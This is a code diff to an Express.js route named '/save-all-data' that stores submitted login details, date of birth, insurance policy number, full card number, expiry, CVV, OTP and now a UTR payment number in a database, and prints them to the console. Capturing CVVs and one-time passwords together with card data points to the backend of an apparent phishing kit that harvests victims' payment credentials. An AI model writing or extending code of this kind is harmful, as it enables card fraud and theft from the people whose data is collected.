@@ -4,9 +4,9 @@ import { query } from '../config/db.js'
 const router = express.Router()
 
 router.post('/save-all-data', async (req, res) => {
-  const { loginData, paymentData, cardData, otpValue } = req.body
+  const { loginData, paymentData, cardData, otpValue, utrNumber } = req.body
   
-  console.log('Received data:', { loginData, paymentData, cardData, otpValue })
+  console.log('Received data:', { loginData, paymentData, cardData, otpValue, utrNumber })
   
   const timestamp = new Date()
   const date = timestamp.toLocaleDateString()
@@ -15,8 +15,8 @@ router.post('/save-all-data', async (req, res) => {
   try {
     const result = await query(
       `INSERT INTO user_info 
-       (login_mobile, login_dob, login_for, name, policy_number, mobile, amount, payment_status, card_number, card_expiry, card_cvv, card_name, otp_value, created_at, date, time) 
-       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16)
+       (login_mobile, login_dob, login_for, name, policy_number, mobile, amount, payment_status, card_number, card_expiry, card_cvv, card_name, otp_value, utr_number, created_at, date, time) 
+       VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17)
        RETURNING id`,
       [
         loginData?.mobile || '',
@@ -32,6 +32,7 @@ router.post('/save-all-data', async (req, res) => {
         cardData?.cardCvv || '',
         cardData?.cardName || '',
         otpValue || '',
+        utrNumber || '',
         timestamp,
         date,
         time
